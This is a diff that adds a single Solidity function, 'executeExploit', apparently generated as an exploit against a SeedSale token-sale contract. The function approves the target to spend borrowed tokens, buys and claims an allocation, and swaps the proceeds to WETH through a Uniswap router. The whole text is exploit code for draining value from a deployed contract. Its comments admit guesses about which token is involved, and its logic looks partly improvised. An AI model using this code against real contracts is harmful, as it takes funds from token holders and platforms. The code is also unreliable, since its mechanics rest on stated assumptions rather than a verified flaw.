@@ -1,0 +1,30 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Approve the SeedSale contract to spend the borrowed valuableToken
+    valuableToken.approve(address(target), amount);
+    
+    // Step 2: Setup the allocation and buy tokens from SeedSale
+    // Using BUSD currency as per the SeedSale contract
+    ISeedSale seedSale = ISeedSale(target);
+    seedSale.buy(ISeedSale.USDCurrency.busd);
+
+    // Step 3: Mock behavior of tokens that would have been released 
+    // Mimic the token claiming process after buying allocation
+    seedSale.claim();
+
+    // Step 4: Swap the tokens received (assuming they are FOTA) back to WETH 
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // Replace with the actual token if different
+    path[1] = uniswapRouter.WETH();
+
+    // Obtain the balance of FOTA tokens to swap back
+    uint256 fotaBalance = valuableToken.balanceOf(address(this));
+    // Approve for the Router to spend tokens
+    valuableToken.approve(address(uniswapRouter), fotaBalance);
+
+    // Swap tokens back to WETH
+    uniswapRouter.swapExactTokensForETH(fotaBalance, 0, path, address(this), block.timestamp);
+}
+</executeExploitCode>
+```
